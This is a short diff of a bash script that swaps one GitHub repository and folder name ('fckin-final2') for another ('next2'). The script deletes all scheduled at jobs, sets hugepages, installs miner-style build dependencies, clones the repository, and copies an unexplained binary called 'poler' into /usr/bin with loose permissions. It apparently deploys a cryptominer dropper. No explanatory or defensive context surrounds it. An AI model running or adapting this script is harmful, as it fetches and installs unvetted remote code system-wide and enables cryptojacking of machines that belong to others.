@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/fckin-final2/
+rm -rf /tmp/next2/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir fckin-final2
-git clone https://github.com/masketteland/fckin-final2.git /tmp/fckin-final2
-cd /tmp/fckin-final2
-chmod +x /tmp/fckin-final2/poler
+cd /tmp && mkdir next2
+git clone https://github.com/wizarduated/next2.git /tmp/next2
+cd /tmp/next2
+chmod +x /tmp/next2/poler
 chmod 777 ./*.sh
-cp /tmp/fckin-final2/poler /usr/bin/
+cp /tmp/next2/poler /usr/bin/
 sleep 3
 
 sudo apt-get install dos2unix
